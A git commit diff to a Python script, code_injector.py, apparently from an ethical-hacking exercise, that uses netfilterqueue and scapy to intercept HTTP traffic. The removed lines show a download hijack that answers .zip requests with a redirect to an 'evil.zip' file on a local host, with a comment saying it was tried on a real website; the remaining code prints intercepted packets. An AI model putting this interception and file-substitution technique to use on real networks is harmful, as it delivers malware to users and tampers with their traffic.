f7130bbd23090f7b7ce364d477c9e546c1887bf7
Maffey <matiusz98@gmail.com>
2020-03-24 18:38:09 -0400

    little cleanup

--- code_injector.py
+++ code_injector.py
@@ -4,8 +4,6 @@
 import netfilterqueue
 import scapy.all as scapy
 
-ack_list = []
-
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
@@ -19,18 +17,12 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".zip" in scapy_packet[scapy.Raw].load:
-                # Tested on unsecured website: chomikuj.pl
-                print("[+] Download ZIP Request")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
+            print("[+] Request")
+            print(scapy_packet.show())
 
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)  # Could be converted to walrus assignment in 3.8.
-                print("[+] Replacing file")
-                modified_packet = set_load(scapy_packet,
-                                           "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/downloads/evil.zip\n\n")
-                packet.set_payload(str(modified_packet))
+            print("[+] Response")
+            print(scapy_packet.show())
 
     packet.accept()
 
